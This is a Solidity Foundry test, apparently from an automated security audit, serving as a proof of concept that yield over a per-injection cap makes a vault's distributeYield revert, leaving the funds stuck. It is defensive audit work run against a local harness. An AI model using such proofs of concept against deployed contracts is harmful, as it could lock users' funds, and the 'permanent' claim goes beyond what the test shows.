// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ATTACK TIMELINE:
// 1. [Setup] Harness deploys the full protocol. We ensure sUSDM has stakers so userShare > 0.
// 2. [T=0] Deposit and stake as user1 to initialize sUSDM totalSupply and prevent division by zero / zero share.
// 3. [T=1] Mint a massive amount of USDC (100M) to YieldEscrow. 70% of this (70M) will exceed config.maxYieldPerInjection().
// 4. [T=2] Operator (admin) calls vault.distributeYield().
// 5. [Assert] The transaction reverts with "sUSDM: yield exceeds max" because injectYield caps the injection.
// 6. [Assert] YieldEscrow balance remains unchanged, proving permanent DoS of yield distribution.

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";

contract AuditAgentPoC is ToL1WeiHarness {
    function test_exploit() public {
        // Step 1 & 2: Ensure sUSDM has stakers so userShare is computed normally
        _depositAs(user1, 100_000e6);
        _stakeAs(user1, 1_000e6);

        // Step 3: Accumulate massive yield in YieldEscrow beyond maxYieldPerInjection cap
        uint256 massiveYield = 100_000_000e6; // 100 million USDC
        usdc.mint(address(yieldEscrow), massiveYield);

        // Step 4 & 5: Operator attempts to distribute yield, but it reverts due to cap
        vm.prank(admin);
        vm.expectRevert("sUSDM: yield exceeds max");
        vault.distributeYield();

        // Step 6: Verify yield is permanently stuck (DoS)
        assertEq(usdc.balanceOf(address(yieldEscrow)), massiveYield, "YieldEscrow balance should remain unchanged due to DoS");
    }
}
